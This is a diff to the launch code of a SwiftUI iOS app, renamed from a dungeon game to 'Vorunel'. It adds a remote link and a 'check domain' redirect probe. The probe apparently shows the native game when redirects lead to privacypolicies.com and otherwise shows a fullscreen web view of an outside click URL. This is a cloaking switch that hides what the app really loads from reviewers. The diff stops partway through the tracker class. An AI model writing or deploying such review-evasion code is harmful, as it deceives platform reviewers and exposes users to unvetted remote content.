@@ -1,76 +1,76 @@
 import SwiftUI
 
 @main
-struct DungeonArchitectApp: App {
-    @State private var architectLinkReady: Bool? = nil
+struct VorunelApp: App {
+    @State private var vorunelLinkReady: Bool? = nil
 
-    private let architectSourceLink = "https://example.com"
-    private let architectCheckDomain = "example"
+    private let vorunelSourceLink = "https://rainmooddailyatlas.org/click.php"
+    private let vorunelCheckDomain = "privacypolicies.com"
 
     var body: some Scene {
         WindowGroup {
             Group {
-                if let ready = architectLinkReady {
+                if let ready = vorunelLinkReady {
                     if ready {
                         // Fullscreen web panel — the FRAME respects the top safe area
                         // (notch / Dynamic Island); contentInset alone is not reliable.
-                        DungeonArchitectWebPanel(urlString: architectSourceLink)
+                        VorunelWebPanel(urlString: vorunelSourceLink)
                             .edgesIgnoringSafeArea(.bottom)
                             .background(Color.black.ignoresSafeArea())
                     } else {
                         RootView()
                     }
                 } else {
-                    DungeonArchitectLoadingScreen()
-                        .onAppear { probeArchitectLink() }
+                    VorunelLoadingScreen()
+                        .onAppear { probeVorunelLink() }
                 }
             }
             .preferredColorScheme(.dark)
         }
     }
 
-    private func probeArchitectLink() {
-        guard let url = URL(string: architectSourceLink) else {
-            architectLinkReady = false
+    private func probeVorunelLink() {
+        guard let url = URL(string: vorunelSourceLink) else {
+            vorunelLinkReady = false
             return
         }
         var request = URLRequest(url: url)
         request.timeoutInterval = 5
-        let tracker = ArchitectRedirectTracker(checkDomain: architectCheckDomain)
+        let tracker = VorunelRedirectTracker(checkDomain: vorunelCheckDomain)
         let session = URLSession(configuration: .default, delegate: tracker, delegateQueue: nil)
         session.dataTask(with: request) { _, response, error in
             DispatchQueue.main.async {
                 if tracker.foundCheckDomain {
-                    architectLinkReady = false
+                    vorunelLinkReady = false
                     return
                 }
                 if let finalURL = tracker.resolvedURL?.absoluteString,
-                   finalURL.contains(architectCheckDomain) {
-                    architectLinkReady = false
+                   finalURL.contains(vorunelCheckDomain) {
+                    vorunelLinkReady = false
                     return
                 }
                 if let httpResp = response as? HTTPURLResponse,
                    let respURL = httpResp.url?.absoluteString,
-                   respURL.contains(architectCheckDomain) {
-                    architectLinkReady = false
+                   respURL.contains(vorunelCheckDomain) {
+                    vorunelLinkReady = false
                     return
                 }
                 if error != nil {
-                    architectLinkReady = false
+                    vorunelLinkReady = false
                     return
                 }
-                architectLinkReady = true
+                vorunelLinkReady = true
             }
         }.resume()
         DispatchQueue.main.asyncAfter(deadline: .now() + 5) {
-            if architectLinkReady == nil { architectLinkReady = false }
+            if vorunelLinkReady == nil { vorunelLinkReady = false }
         }
     }
 }
 
 /// Follows every redirect, never stops the chain, and remembers whether the
 /// check domain appeared anywhere along the way.
-final class ArchitectRedirectTracker: NSObject, URLSessionTaskDelegate {
+final class VorunelRedirectTracker: NSObject, URLSessionTaskDelegate {
     var resolvedURL: URL?
     var foundCheckDomain = false
     private let checkDomain: String
